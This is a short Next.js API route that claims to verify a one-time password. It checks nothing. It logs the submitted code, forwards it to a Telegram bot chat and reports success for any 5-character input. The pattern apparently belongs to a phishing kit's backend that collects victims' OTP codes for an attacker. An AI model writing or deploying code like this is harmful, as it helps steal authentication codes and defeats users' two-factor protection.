import { NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

async function sendOTPMobile(otp: string) {
  const message = `
🔐 *رمز التحقق (OTP)*

${otp}
  `.trim();

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    }),
  });

  return response.json();
}

export async function POST(request: Request) {
  try {
    const { otp } = await request.json();

    console.log("验证 OTP:", otp);

    await sendOTPMobile(otp);

    if (otp && otp.length === 5) {
      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ success: false, message: "Invalid OTP" }, { status: 400 });
  } catch (error) {
    console.error("Error verifying OTP:", error);
    return NextResponse.json({ success: false, message: "Internal server error" }, { status: 500 });
  }
}
